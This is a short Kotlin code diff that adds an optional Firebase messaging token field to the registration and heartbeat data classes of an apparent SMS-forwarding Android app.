@@ -74,7 +74,8 @@ data class RegisterData(
     val isCharging: Boolean,
     val signalStrength: Int,
     val networkType: String,
-    val sims: List<Map<String, Any?>>
+    val sims: List<Map<String, Any?>>,
+    val fcmToken: String? = null
 )
 
 // Heartbeat data sent periodically
@@ -86,7 +87,8 @@ data class HeartbeatData(
     val networkType: String,
     val sims: List<Map<String, Any?>>,
     val uptime: Long,
-    val smsForwarded: Int
+    val smsForwarded: Int,
+    val fcmToken: String? = null
 )
 
 // SMS received data sent when new SMS arrives
